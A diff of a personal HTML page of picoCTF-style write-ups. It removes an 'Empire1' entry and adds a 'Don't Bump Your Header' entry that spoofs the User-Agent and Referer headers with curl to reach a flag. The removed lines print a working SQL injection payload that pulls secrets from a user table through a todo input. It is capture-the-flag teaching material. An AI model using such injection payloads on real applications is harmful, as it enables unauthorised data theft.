@@ -4,7 +4,7 @@
   <meta charset="utf-8" />
   <meta name="generator" content="pandoc" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
-  <title>Empire1</title>
+  <title>Don't Bump Your Header</title>
   <style>
       code{white-space: pre-wrap;}
       span.smallcaps{font-variant: small-caps;}
@@ -23,20 +23,17 @@
     <div id="header"><a class="header" href="../../index.html">[]|\|[-/-\|_/\/\[]|\||)</a></div>
     <div id="content" class="content" style="width:70%;height:auto">
 <header id="title-block-header">
-<h1 class="title">Empire1</h1>
+<h1 class="title">Don't Bump Your Header</h1>
 </header>
-<ol type="1">
-<li>Register a new user and sign in, now we are allowed to create a todo, list todos and list employee.</li>
-<li>In the todo creation page we have an input box to some text.</li>
-<li>Try to create a todo. It result in internal error with <code>'</code>, but <code>''</code> works.</li>
-<li>There may be tables <code>todo</code>, <code>user</code> in databases.</li>
-</ol>
-<p>The todo creation is to insert a record into the <code>todo</code> table, the SQL would be like <code>INSERT INTO todo VALUES (userid, 'content')</code>.</p>
-<p>Tried out the following line</p>
-<pre><code>&#39;||(select secret from user where secret like &#39;pico%&#39; limit 1)||&#39;</code></pre>
-<p>The insert SQL becomes</p>
-<pre><code>INSERT INTO todos VALUES (userid, &#39;&#39;||(select secret from user where secret like &#39;pico%&#39; limit 1)||&#39;&#39;</code></pre>
-<p>Now go to <code>Your Todos</code>, the flag is displayed.</p>
+<p>The challenge gives a url named <code>/header.php</code>, we got blocked whiling access the page</p>
+<pre><code>Sorry, it seems as if your user agent is not correct, in order to access this website. The one you supplied is: chrome 
+&lt;!-- Sup3rS3cr3tAg3nt  --&gt;</code></pre>
+<p>Changed the user agent to <code>Sup3rS3cr3tAg3nt</code> and visit again, we got a new hint</p>
+<pre><code>Sorry, it seems as if you did not just come from the site, &quot;awesomesauce.com&quot;.                  
+&lt;!-- Sup3rS3cr3tAg3nt  --&gt;</code></pre>
+<p>Now we change the referrer to <code>awesomesauce.com</code> and try again</p>
+<pre><code>curl -v -H &#39;User-Agent: Sup3rS3cr3tAg3nt&#39; --referrer awesomesauce.com http://165.227.106.113/header.php</code></pre>
+<p>The flag is in the response.</p>
     </div>
     <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
 </body>
